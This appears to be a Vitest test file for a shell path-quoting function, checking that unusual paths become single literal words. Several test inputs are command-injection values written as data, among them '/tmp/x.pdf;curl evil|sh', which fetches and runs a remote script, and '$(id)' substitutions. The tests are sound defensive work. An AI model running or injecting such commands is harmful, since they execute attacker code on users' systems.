import { describe, expect, it } from 'vitest';
import { shellQuotePath } from './shell-quote.js';

describe('shellQuotePath', () => {
  it('leaves plain paths alone, home-relative ones included', () => {
    expect(shellQuotePath('~/a-1.txt')).toBe('~/a-1.txt');
    expect(shellQuotePath('./x=1')).toBe('./x=1');
    expect(shellQuotePath('/Users/me/.untether/control/uploads/ab-1.jpg')).toBe(
      '/Users/me/.untether/control/uploads/ab-1.jpg'
    );
  });

  it.each([
    ['/tmp/x.pdf;curl evil|sh', `'/tmp/x.pdf;curl evil|sh'`],
    ['/tmp/a $(id).txt', `'/tmp/a $(id).txt'`],
    ['/tmp/a `id`', `'/tmp/a \`id\`'`],
    [`/tmp/it's here`, `'/tmp/it'\\''s here'`],
    ['~/My Docs/a.txt', `~/'My Docs/a.txt'`],
    ['-rf', `'-rf'`],
    ['=ls', `'=ls'`],
    ['~root/x', `'~root/x'`],
  ])('quotes %j so the shell treats it as one literal word', (path, quoted) => {
    expect(shellQuotePath(path)).toBe(quoted);
  });
});
